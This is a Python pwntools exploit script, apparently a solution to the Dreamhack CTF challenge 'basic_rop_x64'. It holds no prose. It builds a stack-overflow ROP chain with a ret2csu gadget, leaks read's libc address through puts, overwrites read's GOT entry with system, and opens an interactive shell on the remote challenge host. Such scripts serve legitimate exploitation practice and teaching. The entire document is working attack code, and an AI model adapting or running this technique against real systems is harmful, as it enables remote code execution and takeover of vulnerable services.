from pwn import *

#p = process('./basic_rop_x64')
p = remote('host3.dreamhack.games', 18479)
e = ELF('./basic_rop_x64')
#libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')

read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']

read_offset = libc.symbols['read']
binsh_offset = next(libc.search(b"/bin/sh"))
system_offset = libc.symbols['system']

csu_call = 0x400860
csu_init = 0x400876

pop_rdi_ret = 0x400883

def chain(func, arg1, arg2, arg3):
	pload = b""
	pload += b"A"*8 #add rsp, 0x8
	pload += p64(0) #rbx
	pload += p64(1) #rbp
	pload += p64(func) #r12, call_func_addr
	pload += p64(arg3) #r13, rdx
	pload += p64(arg2) #r14, rsi
	pload += p64(arg1) #r15, edi
	pload += p64(csu_call)
	return pload	

payload = b'A'*0x40
payload += b'B'*0x8 #sfp

#put read_got
payload += p64(pop_rdi_ret)
payload += p64(read_got)
payload += p64(puts_plt)

#read_got overwrite
payload += p64(csu_init)
payload += chain(read_got, 0, read_got, 0x10)


#read_plt

payload += b"A"*8
payload += p64(0)*6
payload += p64(pop_rdi_ret)
payload += p64(read_got+0x8)
payload += p64(read_plt)

p.send(payload)

p.recv(0x40)
read_addr = u64(p.recv(0x6)+b'\x00\x00')
libc_base = read_addr - read_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

print("read_addr:" ,hex(read_addr))
print("libc_base:", hex(libc_base))
print("system_addr:", hex(system_addr))
print("binsh_addr:", hex(binsh_addr))

p.send(p64(system_addr)+b"/bin/sh\x00")

p.interactive()

